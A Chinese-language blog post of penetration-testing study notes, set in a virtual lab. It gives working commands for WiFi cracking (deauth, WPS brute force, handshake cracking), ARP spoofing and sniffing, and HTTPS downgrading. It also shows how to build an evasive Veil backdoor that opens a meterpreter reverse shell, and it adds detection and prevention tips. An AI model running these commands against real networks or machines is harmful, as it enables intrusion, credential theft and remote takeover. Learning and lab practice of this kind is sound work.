---
layout: post
title: 資訊安全/滲透測試
date: 2022-12-02 23:05 +0800
---

## 前言
以下是我在網路上學到的對資安有幫助技能與觀念,在這邊整理一下學習過程    
主要藉由了解如何"實際"進行網路攻擊,從而理解哪些地方可能會有資安疑慮


## 事前準備

<h3>1.VM軟體:  </h3>
<h6>VMware或VirtualBox都行</h6>  
<h3>2.kali linux:  </h3>  
<h6>在VM上執行，扮演攻擊者的角色</h6>
kali官網：[https://www.kali.org/get-kali/#kali-platforms](https://www.kali.org/get-kali/#kali-platforms)
<h3>3.Metasploitable: </h3>   
<h6>在VM上執行，扮演受害者的角色  </h6>
Metasploitable VM下載點:[https://sourceforge.net/projects/metasploitable/](https://sourceforge.net/projects/metasploitable/)
<h3>4.Win10:  </h3>  
<h6>在VM上執行，扮演受害者的角色  </h6>
Win10 VM下載點:[https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/)
<h3>5.USB無線網卡: </h3>   
  如果可調整成Monitor模式，可以實作破解WIFI密碼手法，  
  這邊紀錄的網路攻擊，都是建立在攻擊方與受害方在同個網路之下為前提  
  不能調整成Monitor模式的話也沒關係，畢竟用VM和USB無線網卡，模擬測試時攻擊者和受害者一定會在同個網路底下  
  

## WIFI密碼破解，無Monitor模式請略過

### 檢查有無支援Monitor模式
1.在VM開啟kali linux後,插入USB網卡
使用「iw list」，確認有無支援Monitor模式
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/1.png){: width="600" height="500" }
<script  type='text/javascript' src=''>

    iw list


### 修改網卡Mac的方式 (可省略)
1.插入Usb無線網卡，並使用ifconfig指令，確定有出現wlan
如圖我出現的是wlan0
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/3.png){: width="600" height="500" }

2.修改Mac號碼的方式
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/2.png){: width="600" height="500" }
Step1.停用網卡
<script  type='text/javascript' src=''>

    ifconfig wlan0 down

Step2.設定新的Mac號碼
<script  type='text/javascript' src=''>

    ifconfig wlan0 hw ether 00:11:22:33:44:55

Step3.起用網卡
<script  type='text/javascript' src=''>

    ifconfig wlan0 up

### 設定為監聽模式
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/4.png){: width="600" height="500" }
iwconfig
<script  type='text/javascript' src=''>

    iwconfig

ifconfig wlan0 down
<script  type='text/javascript' src=''>

    ifconfig wlan0 down

airmon-ng check kill
<script  type='text/javascript' src=''>

    airmon-ng check kill 

iwconfig wlan0 mode monitor
<script  type='text/javascript' src=''>

    iwconfig wlan0 mode monitor

ifconfig wlan0 up
<script  type='text/javascript' src=''>

    ifconfig wlan0 up

ifconfig wlan0 down
<script  type='text/javascript' src=''>

    ifconfig wlan0 down

### 監聽模式下-偵測周圍網路

使用airodump可以監聽周圍WIFI
監聽2.4G頻寬的WIFI指令
<script  type='text/javascript' src=''>

    airodump-ng wlan0

監聽5G頻寬的 WIFI
<script  type='text/javascript' src=''>

    airodump-ng --band a wlan0

監聽5G和2.4G頻寬的WIFI
<script  type='text/javascript' src=''>

    airodump-ng --band abg wlan0
<p>指令成功後，大概會長這樣</p>
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/5.png){: width="600" height="500" }
### WIFI加密的意義

監聽特定WIFI的，並將其封包內容儲存到檔案中
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/6.png){: width="600" height="500" }
<script  type='text/javascript' src=''>

    airodump-ng --bssid MacNo --channel 149 --write FilePath wlan0

使用ls可以看到剛剛儲存的檔案
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/6-1.png){: width="600" height="500" }

使用Wireshark開啟剛剛另存的Cap檔
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/7.png){: width="600" height="500" }

開啟Cap檔後，可以看到傳輸內容，但內容已經過加密
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/8.png){: width="600" height="500" }

### WIFI密碼破解,by WPS功能

使用指令確認WPS功能是否開啟，並找到Bssid
<script  type='text/javascript' src=''>

    wash --interface wlan0

使用aireplay建立關聯性
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/10.png){: width="600" height="500" }
<script  type='text/javascript' src=''>

    aireplay-ng --fakeauth 30 -a Source_Mac -h Target_Mac wlan0

使用reaver暴力破解WPS PING
備註:這部分會需要等待一段時間
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/9.png){: width="600" height="500" }
<script  type='text/javascript' src=''>

    reaver --bssid Target_Mac --channel 5 --interface wlan0 -vvv --no-associate

### WIFI密碼破解,by handshake

每當有人連上WIFI時,路由器基於handshake協定發送封包，主要建立彼此的連線，  
這邊則在監聽指定WIFI，透過監聽封包來獲取能夠建立連線封包資訊

![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/001.png){: width="600" height="500" }  
可以使用airodump監聽特定WIFI，並將其監聽結果解入到特定檔案中，指令如下  
<script  type='text/javascript' src=''>

    airodump-ng --bssid MacNo --channel 5 --write handshake_File wlan0

也可以使用deauth指令斷開某個設備與路由器間的網路連線  
這邊發送4個封包,會馬上斷開,馬上重新連線，所以體感不會有甚麼感覺，但如果設定太大會讓人查覺到網路有異常
<script  type='text/javascript' src=''>

    aireplay-ng --deauth 4 -a 路由器Mac -c 目標設備Mac wlan0

使用crunch指令,將密碼組合排列產生到檔案中  
如下指令意思是,使用「a,b,c,1,2,3」組成3碼到8碼字串,並將這些可能的組合儲存到textP.TXT中
<script  type='text/javascript' src=''>

    crunch 3 8 abc123 -o textP.TXT


最後，需要使用aircrack，能利用handshake_File.cap與textP.TXT進行暴力破解密碼
<script  type='text/javascript' src=''>

    aircrack-ng handshake_File-01.cap -w textP.TXT

破解成功後,百分比就會停止了
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/002.png){: width="600" height="500" }

## 尋找同個網路下的連線
在kali linux透過指令找到所有有連接到WIFI的設備
1.透過ifconfig指令,確認kali的網路設備的IP
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/11.png){: width="600" height="500" }
<script  type='text/javascript' src=''>

    ifconfig

2.搜尋「與USB網卡(Wlan0)在同個網段的所有設備」  
我這邊的要找的是有連到192.168.50.1到192.168.50.254，使用的指令與結果如下
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/12.png){: width="600" height="500" }
<script  type='text/javascript' src=''>

    netdiscover -r 192.168.50.1/24 -i wlan0

3.安裝NMPA或ZENMAP，用來獲取設備資訊  
  ZENMAP為NMPA的GUI介面
  ![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/13.png){: width="600" height="500" }
<script  type='text/javascript' src=''>

    ZENMAP

### Ping scan
對Target的設備發出Ping 指令，獲取該設備的Mac Address與供應商  
例如我想搜尋192.168.50.1到192.168.50.254的所有設備，所以在Target打的是192.168.50.1/24
  ![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/14.png){: width="600" height="500" }

### Quick scan
  資訊的詳細程度,在Ping scan之上,還多顯示了Port的狀態
  ![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/15.png){: width="600" height="500" }

### Quick scan Plus
資訊的詳細程度,在Quick scan之上,還多顯示了Port的所對應到的服務內容、是甚麼設備、及其作業系統等等
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/16.png){: width="600" height="500" }


## 使用ARP欺騙攻擊
### 連線示意圖
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/17.png){: width="600" height="500" }

### 使用一般的指令來建立連線
要進行ARP欺騙,首先會需要知道目標IP  
這邊開啟我準備了另一個Win10透過，先透過「arp -a」來直接獲取需要的IP:192.168.248.129  
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/18.png){: width="600" height="500" }

在Kali開啟"兩個"cmd視窗，使用arpspoof開始模擬ARP欺騙攻擊  
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/19.png){: width="600" height="500" }
<script  type='text/javascript' src=''>

    arpspoof -i eth0 -t  偽裝IP 目標IP


在上述指令執行後，在Win10系統的CMD執行一次「ARP -a」  
可以明顯看到MAC的變化  
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/20.png){: width="600" height="500" }

最後如果Kali電腦沒有執行轉發指令,會導致一般User無法收到路由器的Request而無法正常上網
<script  type='text/javascript' src=''>

    echo 1 > /proc/sys/net/ipv4/ip_forward

### 使用bettercap套件來建立連線
啟動bettercap
<script  type='text/javascript' src=''>

    bettercap  -iface eth0


透過進行bettercap「ARP欺騙攻擊」的方式  
<script  type='text/javascript' src=''>

    set arp.spoof.fullduplex true
    set arp.spoof.targets 192.168.248.129 
    arp.spoof on



可以將指令打在文字檔,並另文為cap檔
(檔案存在root底下比較容易直接呼叫執行)
做成腳本來執行指令  
 
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/21.png){: width="600" height="500" }
透過cap檔執行的指令
<script  type='text/javascript' src=''>

    bettercap -iface eth0 -caplet spoof.cap



使用net.sniff模組的功能
<script  type='text/javascript' src=''>

    net.sniff on

可以用來監聽/解析封包，如果搭配「ARP欺騙」攻擊，可以知道用戶端瀏覽網頁的操作狀況  
如果瀏覽的網頁是http 甚至可以直接擷取到輸入的帳號及密碼  


### 在kali開啟網路熱點來建立連線
讓其他電腦使用kali建立的熱點進行網路連線，也能讓連線狀態變成這樣  
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/17_1.png){: width="600" height="500" }

而kali在中，就能直接透過WIRESHARK分析，擷取所有User所進行網路操作資料
下圖為kali建立的熱點時的樣子  
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/22.png){: width="600" height="500" }
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/23.png){: width="600" height="500" }

## https降級攻擊
<p>>將https網頁 降級成 http網頁</p>
<p>降級原因：與其解析https的數據，不如將https降為http，解析http較為方便</p>
攻擊前置作業：[使用bettercap套件來建立連線](#使用bettercap套件來建立連線) or [使用一般的指令來建立連線](#使用一般的指令來建立連線)


執行net.sniff.local，用來偽裝成本地電腦，以便顯示本地電腦從http網頁中輸入的帳號密碼
<script  type='text/javascript' src=''>

    set net.sniff.loacl true


<p>使用hstshijack可以將用戶端瀏覽的Https網站降級成Http網站</p>
依每個網站的安全姓，當然不見得每個網站都會見效
<script  type='text/javascript' src=''>

    hstshijack/hstshijack 


<p>小記1:有些網站在降級之後無法顯示網頁是因為本地有設置HSTS，強迫這網頁一定只能用Https進入</p>
<p>小記2:如果使用"一開始就不是Https連線的瀏覽器"，就能解決「小記1」的問題（怪不得有些軟體會強制安裝新的不明瀏覽器</p>





## WIRESHARK 網路分析器
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/24.png){: width="600" height="500" }




## 偵測「ARP欺騙攻擊」的方式
### 下載XARP
 [載點](https://en.softonic.com/download/xarp/windows/post-download)  
 ![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/25.png){: width="600" height="500" }  

 開啟XARP就會監聽IP及MAC，受到攻擊時就會跳出異常通知
 ![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/26.png){: width="600" height="500" }  

 ### 下載WIRESHARK
 [載點]( https://www.wireshark.org/#download/)  
 開啟WIRESHARK，並勾選ARP Request 偵測  
  ![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/27.png){: width="600" height="500" }  

  首頁會顯示每個網路口的流量
   ![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/28.png){: width="600" height="500" }  

選擇要對應的網路口後，開始監測
 ![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/29.png){: width="600" height="500" }  


監測時，若受到ARP攻擊，可以從分析資訊中看到跟ARP有關的警告字串
 ![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/30.png){: width="600" height="500" }  

小記
ARP攻擊的手法，會與「arp -a」這個指令所看到的Phtsical Address(Mac號碼)息息相關  
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/31.png){: width="600" height="500" }
如果Type為Daynamic，會讓Phtsical Address可以被人竄改，進而造成ARP攻擊成功
如果Type為Static，將不允許Phtsical Address進行變更，雖然得手動配置網路，但是可以不用擔心受到ARP攻擊

## 預防「ARP欺騙攻擊」的方式
1.使用VPN ,付費,資料不會被後台看到,就算看到了被加密過的資料,VPN廠商有心的話，可以看到原始資料，所以要慎選廠商
2.使用Https Everwhere =>免費,但僅適用於那些被降級成http的原https網站
3.上述兩者可以一起用,不衝突,安全程度會上升


用來幫助網管追蹤網路的工具

## 測試攻擊Metasploitable系統
安裝完Metasploitable後，可以使用ifconfig得到一個簡單的Server的IP  
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/32.png){: width="300" height="250" }


使用ZENMAP來找這個Server開放的Port  
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/33.png){: width="300" height="250" }



## 生成不會被發現的後門文件
<h1>測試生成1個後門文件，讓對方連進我們的Kali電腦中，藉此取得對方電腦控制權</h1>
### 安裝在Kali中安裝Veil Framework
安裝成功後，輸入Veil會產生的畫面
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/34.png){: width="300" height="250" }


### 生成後門文件
Step1.list
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/35.png){: width="300" height="250" }
<script  type='text/javascript' src=''>

    list 

Step2.使用Evation
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/36.png){: width="300" height="250" }
<script  type='text/javascript' src=''>

    use 1 


Step3.list
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/37.png){: width="300" height="250" }
<script  type='text/javascript' src=''>

    list


Step4.第15項,建立反向連結檔案  
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/38.png){: width="300" height="250" }
<script  type='text/javascript' src=''>

    use 15


Step5.使用options可以看到所有可以設定的項目  
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/39.png){: width="300" height="250" }
<script  type='text/javascript' src=''>

    options


Step5.使用set Name Value進行設定，設定完再執行一次options，確認是否更改成功  
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/40.png){: width="300" height="250" }
<script  type='text/javascript' src=''>

    set Name Value


step5.使用generate準備進行生成文件,設定文件名稱,執行完畢後就能到指定路徑看到檔案了
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/41.png){: width="300" height="250" }
<script  type='text/javascript' src=''>

    generate

step5.使用msfconsole模組進行,監聽連線
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/42.png){: width="300" height="250" }
<script  type='text/javascript' src=''>

    msfconsole

step5.use exploit/multi/handler
<script  type='text/javascript' src=''>

    use exploit/multi/handler

step5.在設定一次連線,並使用exploit指令進行監聽
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/43.png){: width="300" height="250" }
<script  type='text/javascript' src=''>

    set Name Value
    set payload windows/meterpreter/reverse_https
    exploit

step5.將檔案放在指定路徑，讓受害端可以下載檔案，測試被攻擊如何
 ![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/45.png){: width="300" height="250" }

step5.使用apache2開啟Server，讓受害端可以進行連線
<script  type='text/javascript' src=''>

    service apache2 start

step5.開啟Win10 看看能否連上剛剛設定的IP
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/44.png){: width="300" height="250" }

step5.下載檔案,進行並執行exe
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/46.png){: width="300" height="250" }

step5.win10執行後,kali就會捕獲到win10的連線
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/47.png){: width="300" height="250" }

step5.之後就能在kali控制win10的電腦了(使用指令操作win10)
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/48.png){: width="300" height="250" }


### 收集資訊的工具-Maltego

![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/49.png){: width="300" height="250" }


## XSS攻擊方式

### 反射型: Reflected-XSS
<p>可以對對方的Server,植入javascript代碼</p>
<p>實際植入的方式可能會向下圖這樣</p>
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/50.png){: width="300" height="250" }

### 儲存型: Stored-XSS  
<p>在留言板上面,打上javaScript代碼,讓javaScript存進資料庫</p>
<p>這樣每當其他用戶瀏覽網頁時,就能自動運行javaScript</p>
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/51.png){: width="300" height="250" }

## 漏洞分析工具
<p>ZAP</p>
<p>使用這個工具可以快速掃描網站可能存在的漏洞</p>
![Desktop View](/assets/img/2022-12-02-side-project-information-security-exercise/52.png){: width="300" height="250" }
